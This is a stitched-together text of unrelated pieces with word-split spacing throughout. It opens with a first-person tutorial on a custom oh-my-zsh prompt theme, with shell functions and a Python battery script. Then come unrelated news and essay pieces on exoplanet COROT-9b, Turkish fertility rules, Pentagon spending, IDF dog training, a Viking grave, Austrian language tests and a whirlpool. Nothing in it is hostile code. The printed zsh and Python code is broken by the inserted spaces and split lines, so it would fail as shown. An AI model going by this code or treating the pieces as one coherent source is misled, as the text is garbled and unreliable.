It 's a great collection of very useful Zsh configurations and aliases which set some sane defaults and make working with Zsh much nicer .
The instructions for installing it are on the project page .
oh - my - zsh uses theme files to specify how your prompt looks .
An oh - my - zsh theme file is just a Zsh script which sets a few variables that the oh - my - zsh scripts use to render your prompt .
Go ahead and create a new theme file for your prompt .
Call it whatever you like .
I called my theme " prose " because it 's more verbose than the others .
Copy the contents of one of the other themes to get started .
The PROMPT variable is what you 'll be modifying to change how your prompt looks .
That 's the PROMPT = whatever line of the theme file .
Once you 're done making your awesome prompt you should fork oh - my - zsh on GitHub and commit / push your new theme so other people can see and use your prompt .
The first two pieces of my prompt are the simplest : username and hostname .
I SSH between machines pretty frequently so I find it nice to have these in my prompt to remind me of where I am .
These are things that you 'll find in many , many Zsh prompts .
For more information about this kind of stuff check out this page .
After adding in the colors this piece of my PROMPT variable looks like this :
%{$fg [ magenta ] %}%n%{$reset_color%} at %{$fg[yellow ] %}%m%{$reset_color%}
I like to have the current working directory displayed in my prompt .
Zsh has two built - in ways to show the current directory :
%d shows the entire path .
shows the entire path .
%~ shows the path with any variables replaced .
Unfortunately neither of these work for me .
If I 'm in a directory that 's under my home directory I want to see ~ instead of the full path .
This would seem to mean that I should use %~ , but there 's a catch .
The %~ sequence also replaces any directories that happen to be environment variables .
That means if I 'm in something under my virtualenvs directory I 'll see ~WORKON_HOME / venv_name which is extremely ugly .
To get around this I defined a simple function that implements the behavior I want .
To add this to your prompt you 'll first need to add the following function to your theme :
function collapse_pwd { echo $ ( pwd | sed -e " s , ^$ HOME , ~ , " ) }
Then add $ ( collapse_pwd ) to your PROMPT variable wherever you 'd like the directory to show up .
After adding in the colors this piece of my PROMPT variable looks like this :
in %{$fg_bold [ green ] %}$( collapse_pwd ) %{$reset_color% }
UPDATE : In a comment Juliano pointed out a better way to do this .
I 've gotten rid of the collapse_pwd function and put this into my PROMPT variable instead :
$ {PWD / #$ HOME/~}
The next piece of my prompt I 'll talk about is the most stand - alone one : the battery charge .
I work exclusively on laptops .
I do n't own a desktop machine — I have a Macbook , Macbook Pro and Asus EEE PC and my work machine is a Macbook Pro .
I work from coffeeshops and client meetings pretty often , so it 's nice to have a reminder of my remaining battery power to know when I need to plug in .
On the right - hand side of the prompt in the screenshot you can see a series of green triangles .
These represent my current battery charge and they turn to empty triangles as the battery becomes depleted .
Once the battery reaches 60 % they turn yellow and once it reaches 40 % they turn red .
To do this I wrote a very simple Python script to output my current battery capacity .
The entire script is shown below .
import math , subprocess p = subprocess .
Popen ( [ " ioreg " , " - rc " , " AppleSmartBattery " ] , stdout=subprocess .PIPE ) output = p.communicate ( ) [ 0 ] o_max = [ l for l in output . splitlines ( ) if ' MaxCapacity ' in l ] [ 0 ] o_cur = [ l for l in output .
splitlines ( ) if ' CurrentCapacity ' in l ] [ 0 ] b_max = float ( o_max.rpartition ( ' =' ) [ - 1 ] . strip ( ) ) b_cur = float ( o_cur.rpartition ( ' =' ) [ - 1 ] . strip ( ) ) charge = b_cur / b_max charge_threshold = int ( math.ceil ( 10 * charge ) ) total_slots , slots = 10 , [ ] filled = int ( math.ceil ( charge_threshold * ( total_slots / 10.0 ) ) ) * u ' ▸ ' empty = ( total_slots - len ( filled ) ) * u '▹ ' out = ( filled + empty ) .encode ( 'utf - 8 ' ) import sys color_green = '% { [ 32 m % } ' color_yellow = ' % { [ 1;33 m % } ' color_red = '% { [ 31 m % } ' color_reset = '% { [ 00 m % } ' color_out = ( color_green if len ( filled ) > 6 else color_yellow if len ( filled ) > 4 else color_red ) out = color_out + out + color_reset sys.stdout.write ( out )
Note :
The color_* variables contain UTF - 8 characters which do n't show up in a normal web browser .
They should be preserved when copying and pasting from a decent browser .
If the colors do n't work find me on Twitter and I 'll put the raw script up somewhere so you can download it .
UPDATE : ehamberg sent me the beginnings of a Linux - compatible battery capacity script .
If you flesh it out and make it into a complete script please let me know and I 'll add it here .
I 've put this script in a file named batcharge .py in my ~ / bin/ directory .
You can of course name it and place it anything / anywhere you like .
No , it 's not perfect .
No , I do n't care .
It gets the job done and any brainpower I could spend on making it more efficient could be better spent on writing or working on something else .
If you want to improve it , feel free and please send me the link to your work on Twitter so I can use it !
Now that you 've got the script , it 's time to add it to your prompt .
If you want this to appear on the right - hand side of your screen ( like mine does ) you 'll need to add two things to your theme file .
The first is a function that calls the script :
function battery_charge { echo `$BAT_CHARGE` 2>/dev/null }
After that you 'll need to define the Zsh RPROMPT variable :
RPROMPT='$ ( battery_charge ) '
Once those are in your theme file any new Terminal windows you open should show the battery capacity to the right of your prompt !
In my personal work and my full - time job I work with both Mercurial and git repositories .
I find it helpful to have a visual reminder of what kind of repository I 'm working in .
To do this I 've replaced the standard $ character in my prompt with different Unicode characters depending on what kind of repository I 'm currently in :
○ means " I 'm not in any repository . "
means " I 'm not in any repository . " ☿ means " I 'm in a Mercurial repository . "
means " I'm in a Mercurial repository . " ± means " I 'm in a git repository . "
Those particular characters are meant to reflect the logos of the various projects .
You can of course change them to anything that makes sense to you .
To add this feature to your prompt you 'll need to do two things in your theme file .
First , add the following function :
function prompt_char { git branch >/ dev/null 2 >/ dev / null && echo ' ± ' && return hg root >/ dev/null 2 >/ dev / null && echo ' ☿ ' && return echo ' ○ ' }
Then add $ ( prompt_char ) somewhere inside your PROMPT variable — wherever you want the character to be displayed ( probably at the end ) .
I use Mercurial at work and for my own personal projects and I find it very handy to have some information about the current repository right in my prompt .
It keeps me " oriented , " especially when I 'm using MQ and manipulating the state of a repo .
In the past I toyed around with some shell scripts to do this but eventually I got fed up with the poor performance and horrible readability of that solution .
To fix this I wrote a small Mercurial extension called hg - prompt .
It adds an hg prompt command to Mercurial that will let you output information about the current repository .
It 's designed especially for use in shell prompts ( hence the name ) .
I open sourced the code a while ago and since then a few people have made feature requests and / or contributed patches .
It 's grown into a nice , flexible little tool .
You can check out the documentation to see all the things it can do .
I only use a few of the features myself :
The current repository branch .
The " dirty " state of the repo ( whether there are untracked / uncommitted files ) .
Any tags pointing at the current revision .
An " update " character to show whether running hg update would do anything .
would do anything .
A list of MQ patches ( if any are present ) .
To put this into my prompt I 've added a function to my theme :
function hg_prompt_info { hg prompt -- angle - brackets " \ < on < branch > >\ < at < tags| , >>\ < status|modified|unknown><update >< patches : < patches|join( → ) > > "
2>/dev/null }
Inside my PROMPT variable I use $ ( hg_prompt_info ) to show the information .
The 2 >/ dev/null makes sure no output is shown if I do n't happen to be in a Mercurial repository .
Of course this is n't nearly as pretty or readable without color .
Unfortunately adding color codes makes the actual code almost unreadable :
function hg_prompt_info { hg prompt -- angle - brackets " \ < on % { $fg [ magenta ] % }< branch >%{$ reset_color % } > \ < at %{$fg[yellow ] %}<tags|%{$reset_color%} , %{$fg[yellow ] % } >%{$ reset_color % }>\ %{$fg[ green ] %}<status|modified|unknown><update >%{$ reset_color %}< patches : < patches|join( → ) |pre_applied ( %{$ fg[ yellow ] %} ) |post_applied (%{$ reset_color%} ) |pre_unapplied (%{$ fg_bold[ black ] %} ) |post_unapplied (%{$ reset_color %} ) > > "
2>/dev/null }
Small note :
My favorite part of this prompt is that applied MQ patches are orange while unapplied patches are grey .
It makes it very obvious what 's going on .
Showing all the MQ patches is n't something that will work for everyone .
If you work on repositories that ever have more than 5 or 6 patches at a time the output is going to be too overwhelming .
There are some other MQ - related hg - prompt keywords that you might find useful though .
Unfortunately I can't always use Mercurial .
Many projects that I contribute to use git .
I could try to use the hg - git extension to let me use Mercurial to work with them , but the extension just is n't fast or mature enough for my taste .
I 've ended up buckling down and jumping down the rabbit hole that is git's CLI .
Git does n't seem to have any equivalent to hg - prompt , but I still wanted to have some information in my prompt so I do n't get disoriented .
oh - my - zsh has a bit of support for this , but it was n't quite enough for me so I hacked something together to add the last bit of functionality I wanted .
When I 'm in a git repository my prompt now shows :
The current git branch .
Whether there are any changes in the index .
Whether there are any changes not in the index .
Adding this to your prompt is very simple because oh - my - zsh has built - in support for it .
All you need to do is define a few variables in your theme :
ZSH_THEME_GIT_PROMPT_PREFIX= " on % { $fg [ magenta ] %} " ZSH_THEME_GIT_PROMPT_SUFFIX= " %{$ reset_color %} " ZSH_THEME_GIT_PROMPT_DIRTY= " %{$ fg [ green ] %} ! " ZSH_THEME_GIT_PROMPT_UNTRACKED= " %{$ fg [ green ] %} ? " ZSH_THEME_GIT_PROMPT_CLEAN= " "
Once you do that you can put $ ( git_prompt_info ) into your PROMPT variable to make it show up .
Note : The ZSH_THEME_GIT_PROMPT_UNTRACKED
variable is the part I added .
If your want to use that one ( to be able to see indexed and unindexed changes separately ) you 'll need to use my fork of oh - my -zsh .
Here 's what my new " prose " theme file currently looks like in its entirety :
function collapse_pwd { echo $ ( pwd | sed -e " s , ^$ HOME , ~ , " ) } function prompt_char { git branch >/ dev/null 2 >/ dev / null && echo ' ± ' && return hg root >/ dev/null 2 >/ dev / null && echo ' ☿ ' && return echo ' ○ ' } function battery_charge { echo `$BAT_CHARGE` 2>/ dev/null } function virtualenv_info { [ $ VIRTUAL_ENV ] && echo '( ' `basename $ VIRTUAL_ENV` ' ) ' } function hg_prompt_info { hg prompt -- angle - brackets " \ < on % { $fg [ magenta ] % }< branch >%{$ reset_color % } > \ < at %{$fg[yellow ] %}<tags|%{$reset_color%} , %{$fg[yellow ] % } >%{$ reset_color % }>\ %{$fg[ green ] %}<status|modified|unknown><update >%{$ reset_color %}< patches : < patches|join( → ) |pre_applied ( %{$ fg[ yellow ] %} ) |post_applied (%{$ reset_color%} ) |pre_unapplied (%{$ fg_bold[ black ] %} ) |post_unapplied (%{$ reset_color %} ) > > "
2>/dev/null } PROMPT= ' %{$fg [ magenta ] %}%n%{$reset_color%} at %{$fg[yellow ] %}%m%{$reset_color%} in %{$fg_bold [ green ] %}$( collapse_pwd ) %{$reset_color%}$( hg_prompt_info ) $( git_prompt_info ) $ ( virtualenv_info ) $ ( prompt_char ) ' RPROMPT='$ ( battery_charge ) '
ZSH_THEME_GIT_PROMPT_PREFIX= " on % { $fg [ magenta ] %} " ZSH_THEME_GIT_PROMPT_SUFFIX= " %{$ reset_color %} " ZSH_THEME_GIT_PROMPT_DIRTY= " %{$ fg [ green ] %} ! " ZSH_THEME_GIT_PROMPT_UNTRACKED= " %{$ fg [ green ] %} ? " ZSH_THEME_GIT_PROMPT_CLEAN= " "
The file is also on GitHub .
Remember , you 'll need my fork of oh - my - zsh to use the ZSH_THEME_GIT_PROMPT_UNTRACKED feature .
A shell prompt is something that we 'll each see thousands of times a day , so it 's something that you should take the time to customize into a useful tool .
Feel free to use my prompt as a starting point or just as a source of ideas .
If you have any questions , suggestions , or examples of your own please fine me on Twitter — I 'd love to hear them !
Extrasolar planet hunters are excited about a not - so - hot discovery .
For the first time , they ’ve found a relatively cool extrasolar planet that they can study in detail .
The finding is a milestone , says study co-author Hans Deeg of the Instituto de Astrofísica de Canarias in Tenerife , Spain , because it is the first time astronomers have found an extrasolar planet that not only is cool enough to be similar in composition and history to the familiar solar system gas giants Jupiter and Saturn , but also passes in front of the star it orbits .
Although a number of extrasolar planets with moderate temperatures have been discovered , only a planet that passes in front of – or transits – its star can be studied in depth .
The starlight that filters through the atmosphere of the planet during each passage reveals the orb ’s composition , while the amount of starlight that is blocked outright indicates the planet ’s size .
All the other transiting planets seen so far have been “ weird – inflated and hot ” because they orbit so close to their stars , notes study collaborator Didier Queloz of the Geneva Observatory in Sauverny , Switzerland .
Deeg , Queloz and their colleagues report their findings in the March 18 Nature .
The planet , found with the COROT satellite and dubbed COROT - 9b , lies 1,500 light - years from Earth and never gets closer to its star than Mercury ’s average distance from the sun .
That puts the surface temperature of the planet in a relatively temperate range , somewhere between 250 kelvins and 430 kelvins ( - 23 ˚ to 157˚ Celsius ) .
Although the gaseous planet is n’t expected to be habitable , its atmosphere could contain water vapor .
If this Jupiter - like planet has a moon , that satellite ’s rocky surface could be habitable , says Sara Seager of MIT .
But a planetary system closer to Earth would offer a better chance of searching for the tiny gravitational tug of such a moon , Seager adds .
“ This discovery adds weight to the fact that we know that planets often orbit in or close to the habitable zone , so we should not be surprised when the Kepler or COROT satellites or some ground - based search makes the claim for the first habitable Earth or super - Earth , ” comments Alan Boss of the Carnegie Institution for Science in Washington , D.C .
Nevertheless , finding such a planet is encouraging news , Seager says , because “ where there is gold dust there might be a gold mine . ”

A 29 - year - old man from the Isle of Wight has said that he fears somebody is following him on the microblogging site Twitter .
‘ It all began when someone replied to a post I made , saying ‘ me too ’ , ’ said James Crowthorn , who lives in Sandown .
‘ It happened a few times for different tweets .
It ’s a bit weird – like someone on the internet is paying attention to what I ’m saying . ’
Mr Crowthorn says he keeps looking over his shoulder to see if anyone is watching , but this means that he is unable see his monitor at the same time .
‘ I ’m getting a bit nervous about that , too , ’ he admitted , ‘ because sometimes I get the feeling people can see me , as if there ’s some sort of camera connected up to my computer .
It ’s terrifying – the thought that someone somewhere could have a picture of my face in some sort of book .
I ’m very worried about my privacy , as I was saying on my YouTube channel just yesterday . ’

Turkish citizens cannot conceal the paternity of their children A new law passed in Turkey has made it a criminal offence for a woman to go abroad and get pregnant via artificial insemination .
Artificial insemination is already illegal , but women have until now been able to go overseas to seek sperm donors .
Now they will face punishment of one to three years in prison for doing so .
Doctors and lawyers say they are trying to find out how the government plans to enforce the law .
All sorts of activities can land you in court , and possibly in jail , in Turkey .
Insulting " Turkishness " , taking part in demonstrations , or showing the slightest sympathy for the banned Kurdish Workers '
Party , for example .
Now you can add to that long list the crime of using a foreign sperm donor .
Paternity concerns Artificial insemination is already illegal in Turkey .
Doctors offering fertility treatment here have to make that clear in their advertising .
But women have until now been able to seek sperm donors overseas without fear of prosecution .
We spent years fighting to improve the law so that it would properly protect women 's autonomy over their bodies and sexuality
Pinar Ilkkaracan
Women 's rights campaigner However , a new regulation , quietly published nine days ago by the Turkish Health Ministry , states that any clinics , doctors or patients who use , or encourage the use of , overseas sperm banks will be reported to state prosecutors and face possible criminal charges .
Clinics will be closed down , for three months at first and then permanently if the offence is repeated .
A spokesman at the Department of Health , Irfan Sencan , said the regulation was covered by article 231 of the criminal code , which makes it a crime to conceal the paternity of a child .
But Pinar Ilkkaracan , a prominent women 's rights campaigner in Turkey , said it would be a misinterpretation of a law intended to protect the inheritance rights of children .
" This is completely against the philosophy of the reformed penal code , " she told the BBC .
" We spent years fighting to improve the law so that it would properly protect women 's autonomy over their bodies and sexuality .
" This government has slipped this regulation in without any debate in parliament . "
Conservative outlook " It is a huge step backwards , " said Ismail Mete Itil , chairman of the Turkish Gynaecologists ' and Obstetricians ' Association .
" The law should be reformed to take into account the new choices technology offers women - they have done the opposite .
They have not thought through the implications of this . "
Dr Itil said the number of women seeking sperm donors overseas was small , fewer than 100 a year , but he worries about the implications of the new regulation in other areas , like ethnically - mixed couples .
The issue was publicly discussed last year when one of Turkey 's best - known actresses , Guner Ozkul , announced she had used a sperm donor in Denmark to conceive her daughter , who is now five months old .
Ms Ozkul told the BBC she did not want to comment on the new regulation .
It is hard to imagine pregnant women being put on trial just for the way they conceived , but not impossible in Turkey , where last month a 15 - year - old Kurdish girl was jailed for nearly eight years just for taking part in a demonstration .
Ms Ilkkaracan believes the move reflects the conservative outlook of the governing Justice and Development Party , which has strongly promoted family values .
She cites the party 's failed attempt to criminalise adultery in 2004 , and Prime Minister Recep Tayyip Erdogan 's public call for women to have at least three children as examples .
But Mr Sencan at the Department of Health said it was essential for children to know who their fathers and grandfathers are ; using sperm donors , he said , contravened that requirement .

When was the last time you saw the headline , “ Cost of [ Pentagon - weapons - system - of - your - choice ] halved ” ?
Probably never .
Still , the thought came to mind when this recent Associated Press headline caught my eye : “ Pentagon : F - 35 fighter jet cost doubles . ”
Here ’s the story behind it : Since 2001 , when an F - 35 Joint Strike Fighter was expected to cost an already hefty $ 50 million , the plane ’s cost has soared into the stratosphere ( despite the fact that the aircraft itself has barely left the ground ) .
The estimated cost today is $ 113 million per plane .
Yes , that ’s per plane .
This supposed future workhorse of the U.S. military is now priced like the planet ’s most precious gem .
It ’s also 2 ½ years behind schedule .
Keep in mind that the Marines , the Air Force , and the Navy are planning to buy a combined 2,450 of them for what ’s now an eye - popping $ 323 billion .
And if you think the costs are likely to stay in the $ 113 million range , given the history of Pentagon cost overruns , then I have a nice little national security bridge to Brooklyn I think the U.S. public might love .
In other words , if all goes well from here ( an unlikely possibility ) , a single future weapons system is now estimated to cost the American taxpayer almost one - third of what the Obama administration ’s health - care plan is expected to cost over a decade .
You could even think of the Pentagon ’s weapons procurement process as the health - care system of the national security state .
Its costs just never stop rising .
In fact , the Government Accountability Office pegs major weapons systems cost overruns since 2001 at $ 295 billion , another near third of the cost of the health - care bill supposedly coming to a vote this week .
And here ’s what ’s remarkable :
You barely hear about such overruns .
They ’re almost never front - page headline news , even though the money ’s being taken from not - so - deep taxpayer pockets .
And when truly terrible news , as with the F - 35 , comes in , all that happens in Washington is that a few politicians mutter a little .
John McCain , for example , offered this less than stirring quote on the F - 35 : “ The taxpayers are a little tired of this .
I ca n’t say that I can blame them ” ; and an irritated Senator Carl Levin , chairman of the Senate Armed Services Committee , said : “ We cannot sacrifice other important acquisitions in the DOD [ Department of Defense ] investment portfolio to pay for this capability . ”
( Bet you did n’t even know that future weapons were part of a Pentagon “ investment portfolio . ” )
In the case of Secretary of Defense Robert Gates , he ’s planning to hold back $ 614 million in “ performance bonuses ” from the plane ’s lead contractor Lockheed Martin .
( And you thought only bankers and financial wheeler - dealers got performance bonuses ! )
But it ’s striking that there are no tea party movements out in the streets of America demanding our money back or claiming that we ’re going to be broken by this .
Here ’s an American reality : the Pentagon is our true welfare state , the weapons makers our real “ welfare queens , ” and we never stop shoveling money their way .
Somebody should raise a few tough questions about the Pentagonization of our country and its finances .
Fortunately , TomDispatch has retired Lt. Col. William Astore , historian and regular contributor to this site , to take on the task .
Tom
When it comes to our nation ’s military affairs , ignorance is not bliss .
What ’s remarkable then , given the permanent state of war in which we find ourselves , is how many Americans seem content not to know .
The Pentagon Church Militant and Us The Top Five Questions We Should Ask the Pentagon By William J. Astore
There are many reasons for this state of affairs .
Our civilian leaders encourage us to be deferential toward our latest commander / savior , whether Tommy Franks in 2003 , David Petraeus in 2007 , or Stanley McChrystal in 2010 .
Our media employs retired officers , most of them multi-starred generals , in a search for expertise that ends in an unconditional surrender to military agendas .
A cloud of secrecy and “ black budgets ” combine to obscure military matters , ranging from global strategy to war goals to weapons procurement .
The taxpayer , forced to pony up about one trillion dollars yearly to fund our military , national security infrastructure , and wars , is sent a simple message : stay clear and leave it to the experts in uniform .
The powerlessness of ordinary Americans in military matters is no accident .
Recall the one - word reply -- “ So ? ” -- Dick Cheney offered in March 2008 , when asked to comment on popular opposition to the war in Iraq .
The former vice president was certainly far blunter than Washington usually is , and for that we may owe him a measure of thanks .
By highlighting the arrogant dismissiveness of Washington ’s warrior - elite when it comes to American public opinion , he revealed more than he intended .
Time for Vatican II at the Pentagon
If military power is the church at which we worship and the Pentagon is our American Vatican , then it is desperately in need of the equivalent of Vatican II which , in the early 1960s , opened the Catholic Church to greater participation by the laity , a vitally important change in ethos .
Instead of continuing to pray at the altar of their particular services , we need our Pentagon “ priests ” to turn to the laity -- us -- and seek our input and sanction .
Instead of preaching in unintelligible Pentagonese , with its indecipherable acronyms , secret doctrines , and spidery codenames , it ’s long past time for them to talk to us in a language that reasonably informed adults can understand .
Think about this : last year , our country held innumerable public hearings on health - care reform .
Congress continues to fight about it .
It ’s constant news .
There ’s a debate alive in the land .
All this for a program that , in ten years , will cost the American people as much as defense and homeland security cost in a single year .
Yet runaway defense budgets get passed each year without a single “ town hall ” meeting , next to no media coverage , and virtually no debate in Congress .
Indeed , you ’d think each Pentagon budget was an ex cathedra pronouncement , given the way Congress genuflects before them and Americans accept them without so much as a peep of protest .
Those “ Crazy ” Kiwis
Imagine , for a moment , if Pentagon officials , supposedly toiling in our name , actually condescended to ask us for our thoughts .
What do we think about global military strategy , garrisoning the planet , the ways in which our forces are structured , and how , where , and for what they should be deployed abroad ?
Sound crazy ?
Here in the U.S.A. it most distinctly does , but not to the citizens of New Zealand .
A Kiwi friend of mine recently sent me “ Defence Review 2009 , ” a publication of New Zealand ’s Ministry of Defence ( MoD ) .
And catch this : it includes a survey soliciting the advice of ordinary New Zealanders with respect to military affairs .
It actually asks for the counsel of civilians on a “ top ten ” list of questions whose topics are remarkably comprehensive , including what the priorities of the country ’s Defence Force should be , both now and in the future .
Citizens can even present their views on military matters at a public hearing attended by MoD representatives , all in the name of public consultation .
And the Defence Minister responds to the people in clear English sans the cobwebs of jargon that typically entangle our military pronouncements .
In case you have n’t noticed , here in the U.S.A. , requests from the Pentagon for citizen feedback are n’t flooding our email boxes .
So I thought -- since no one in that five - sided fortress on the Potomac has asked a thing of me -- the least I could do was ask a few questions on my own .
Here , then , is my own top - five list of questions that we , the American people , should ask the Pentagon , even if none of its officials want to hear from us .
Maybe they ’re a tad more pointed than those in the Kiwi survey , but that should n’t be surprising .
After all , they ’ve been a long time in coming .
1 . Our military is supposed to be a means to an end : national security .
Due to its immense size and colossal budget , has our military not become an end as well as means ?
2 . In World War II , Americans could explain “ Why We Fight ” in part because the government provided a clear and compelling rationale for war .
Why are the goals of today ’s wars so opaque to most Americans ?
3 . If our military provides us with our way of “ nation building ” abroad , wo n’t countries and peoples be more likely to copy our military ways and weaponry than our democratic teachings ?
4. America is facing painful budgetary belt tightening .
Why is the military immune ?
5 . Why does “ support our troops ” seemingly end when they leave the service , leading us to tolerate such inequities as an unemployment rate of 21 % for young veterans ?
Keep in mind that there are 10 , 20 , 30 more questions where those five came from -- and our military badly needs to hear and respond to them all .
Every recruit is taught to stretch , to go the extra mile , to push until you can go no further .
Our military needs some stretching and push - back : this time , from us .
Unfortunately , most of us do n’t think our opinions matter when it comes to our military -- unless , that is , they consist solely of slavish adoration .
The fact is most of us are detached from military affairs precisely because we know in our hearts that the Pentagon serves its own needs , that it may be interested in listening in on us , but certainly not in listening to us .
Challenge the Pentagon Church Militant
Kiwis have the reputation of being practical types with an admirable dash of humility , and I like to think that their Ministry of Defence solicits the views of its citizenry not just because it ’s required by statute , but because their officials do n’t believe they have a monopoly on good ideas .
Perhaps the MoD recognizes as well the difficulty military professionals have in thinking outside the box .
Despite its gargantuan size and its endless advisory committees and boards , our Department of Defense is , in essence , a well - insulated church of likeminded believers , administered by tightly - wound power - brokers .
It sees the world only as an arena of , and for , conflict .
Wherever it looks , even within its own ranks , it sees rivals and enemies .
It cannot help dividing the world into believers and heretics , friends and foes .
And it ’s true that the world is a dangerous place .
The problem is : the Pentagon is part of that danger .
Our military has grown so strong and so dominates our government , including its foreign policy and even aspects of our culture , that there ’s no effective counterweight to its closeted , conflict - centered style of thinking .
In fact , the Pentagon ’s heft gives new meaning to the term “ full spectrum dominance ” and helps explain the lack of change in war policy since the 2008 elections .
A vote that constituted an unmistakable call to end our wars in Iraq and Afghanistan -- and so lessen the military ’s influence -- has led only to fresh war “ surges ” and mushrooming Pentagon budgets .
And yet , as the Pentagon charges forward , debate is nearly nonexistent and Congress can muster just 65 votes for a resolution to curtail the endless conflict in Afghanistan .
It ’s shameful that only a so - called far left congressman like Dennis Kucinich has enough sense ( and guts ) to insist on Congressional debate about our forever - war in Afghanistan .
Equally shameful : that Congress allotted only three hours to that debate on matters of life , death , and even financial well - being .
Do we really need reminding that debate makes democracy stronger ?
Evidently so .
Take it from me as a retired Air Force officer : our troops wo n’t be demoralized by more debate and greater citizen participation .
Let ’s face it , all of this represents a long - term sea change in American consciousness .
Sadly , the old idea of the citizen army is dead , and because of this , most of us lack any direct connection to the military ( and seemingly could care less ) .
In the name of safety , security , and solidarity , we ’ve buttoned our lips .
We worship , but do n’t partake .
Centuries from now , historians will look back on American history and wonder how so many gave away so much to so few .
It should be our right to have a say in what defines the “ defense ” of our country .
That right has been surrendered to the few .
Our future may depend on genuine input from the many .
How about it ?
Are you ready to challenge the Pentagon church militant ?
Or are you content to mouth the usual catechism , while continuing to dump billions each week into the collection basket ?
Citizens of courage will surely choose the path of challenge .

The Israel Defense Forces has denied allegations that it trains its canines to attack anybody heard saying Allah Hu Akbar , Arabic for ‘ God is great . ’
Israeli Arab MK Ahmed Tibi on Monday told the Knesset plenum that at a canine unit ceremony held the day before , parents of the soldiers witnessed demonstrations proving these allegations .
“ IDF dogs are trained to pounce and attack any Arab who shouts Allah Hu Akbar , as a Pavlovian reaction , ” said Tibi .
“ So here I say : Allah Hu Akbar .
Are there any dogs here to attack me ? ”
Speculations of such practice were exposed first by Israel Radio ’s military correspondent , Carmela Menashe .
Responding to the allegations , the IDF said in a statement : “ One of the canine unit ’s many capabilities is to train the dogs at locating the enemy when dressed both in uniform and as civilian .
This is an ability that has proven itself in many cases .
London , England ( CNN ) --
They were 51 young men who met a grisly death far from home , their heads chopped off and their bodies thrown into a mass grave .
Their resting place was unknown until last year , when workers excavating for a road near the London 2012 Olympic sailing venue in Weymouth , England , unearthed the grave .
But questions remained about who the men were , how long they had been there and why they had been decapitated .
On Friday , officials revealed that analysis of the men's teeth shows they were Vikings , executed with sharp blows to the head around a thousand years ago .
They were killed during the Dark Ages , when Vikings frequently invaded the region .
" To find out that the young men executed were Vikings is a thrilling development , " said David Score , project manager for Oxford Archaeology , which excavated the remains .
" Any mass grave is a relatively rare find , but to find one on this scale , from this period of history , is extremely unusual and presents an incredible opportunity to learn more about what is happening in Dorset at this time . "
Radiocarbon dating had already placed the remains between A.D. 890 and 1030 , before the Norman conquest of Anglo - Saxon England .
Scientists from the British Geological Survey then went further and analyzed the men's teeth to find out exactly where they were from .
Isotope analysis of teeth can reveal clues about a person 's drinking water , and in turn the climate they came from , said Jane Evans , an isotope geochemist at the survey .
" What we found was all of these guys came from a climate that had to be colder than Britain ... probably Sweden and Norway , " Evans said by phone Friday .
" One guy had such a signature of such a cold climate that he probably came from above the Arctic Circle . "
The isotopes also show the men had eaten a high - protein diet , comparable to known sites in Sweden .
It means the men were probably Scandinavian Vikings who were executed by Anglo - Saxons .
Evans and her colleagues at the British Geological Survey 's NERC Isotope Geosciences Laboratory in Nottingham , England , analyzed 10 of the skeletons over the course of six weeks .
" These results are fantastic , " Evans said .
" This is the best example we have ever seen of a group of individuals that clearly have their origins outside Britain . "
Many of the executed men suffered multiple wounds , inflicted by a sharp - bladed weapon , to the skull , jaw and upper spine , all thought to relate to the process of decapitation , the Dorset County Council said .
Some men show evidence of other wounds , including a cut to the pelvis , blows to the chest and stomach , and defensive injuries to the hands , the council said .
The bones still appear cleanly sliced , indicating the men suffered a " sword - based execution , " Evans said .
There are also two examples of healed fractures that are unlikely to have been medically treated .
In one case , the skeleton 's right leg is 5 centimeters , or about 2 inches , shorter than the left , which would have given the person a pronounced limp , the council said .
The burial site was found during work for the Weymouth Relief Road , meant to ease traffic congestion on the highway to Weymouth , on England 's southern coast .
Weymouth Bay and nearby Portland Harbor will host the Olympic and Paralympic sailing events during the 2012 London Olympics .
The leader of the Dorset County Council , Angus Campbell , said the construction of the road had already revealed prehistoric and Iron Age finds .
" But we never would have dreamed of finding a Viking war grave , " Campbell said in a statement .
" The burial pit took us all by surprise and its story gets more fascinating as the analysis goes on . "
Researchers are hoping to find further evidence about the men's lifestyles , activity , health and diet , the council said .

Finally .
The weather ’s perking up around here and I got out for a long walk today with my jam - packed iPod of dance tunes .
If anyone saw me walking , they either knew I had downloaded the best music ever , or wondered whether I was having a spasm and thought they should call 911 .
I ’m not afraid to dance - walk - spaz in public .
It ai n’t pretty , but you get to a certain age when you just do n’t care anymore what people think of you .
But I did n’t find my groove right away .
First , I suffered through five minutes of electroshock therapy , courtesy of my iPod .
It seems that if it ’s dry enough and that if you create enough static when you walk , that static builds up in the device and finds its way out through the path of least resistance .
That path was straight to my ears .
For the first five minutes of my walk , I could n’t figure out how to stop shocking myself in the head .
I kept the iPod in my pocket .
Shock .
Owwww !
I held the iPod in my hand .
Zzzzzzzppp .
Aieeeeeee !!!!
I realized that the long black Matrix coat I was wearing created enough friction brushing against my legs that I repeatedly got shocked once a block .
I tried holding the coat close enough to my body to keep it from brushing against me but that did n’t work either .
I finally gave up and removed it all together .
Luckily , the sun was out full force and I ’d been walking fast enough , albeit painfully , to sweat a little and fend off the cold .

Here 's an article in Turkish on a new law Austria has enacted requiring immigrants who have family in the country ( i.e. family members that other immigrants bring over after settling in themselves ) to have a certain level of German before being able to immigrate .
Family members immigrating to Austria must have a basic level of German
Austria has approved a package 40 pages in length aimed at immigrants called the Nationaler Aktionsplan für Integration ( National Action Plan for Integration ) , in which family members of immigrants who want to immigrate to Austria must know German .
The most important item in the action plan is the requirement to know German .
In the plan , immigrants that want to move to Austria to join their family members already there must pass a German language test , without which they will not be able to immigrate to the country .
This family reunification system is already in place in Germany , which served as an example to Austria in drafting the plan .
Last year Germany began a law where those immigrating to the country needed to know German .
Green member of parliament Alev Korun said that the requirement for family members immigrating to the country to know German did not apply to EU citizens , and that it was done in order to prevent immigration from areas such as Turkey and the former Yugoslavia in particular .
Korun criticized the new law for having many gaps and being inequal to immigrants .
So what level of skill is being aimed for with this new law ?
According to Austria 's site it 's A2 level German , which is a basic and practical proficiency in the language .
Here 's the type of German one can expect to encounter at that level .
This is the reading portion of a sample test .
The German in the test is not - level basic , but still quite easy , with sentences like : Die Menschen wussten schon immer , dass Lachen gut tut - People have always known that laughing is good for you ( i.e. laughing does good ) .
For information on the test used in Germany , see here
Located on the international boundary between the coasts of Maine and New Brunswick , Canada , the Old Sow whirlpool has been a well known strange site for hundreds of years .
Though said to be named the “ Old Sow ” whirlpool because it makes sounds like the grunts like a pig , it is more likely that it was actually the “ olde sough ” or “ old drain . ”
Pronounced suff , over the years the pronunciation of the Dutch word probably shifted to pronounced like “ sow ” ( much like the word plough , pronounced pluff , turning to plow ) as did the spelling and backstory of its name .
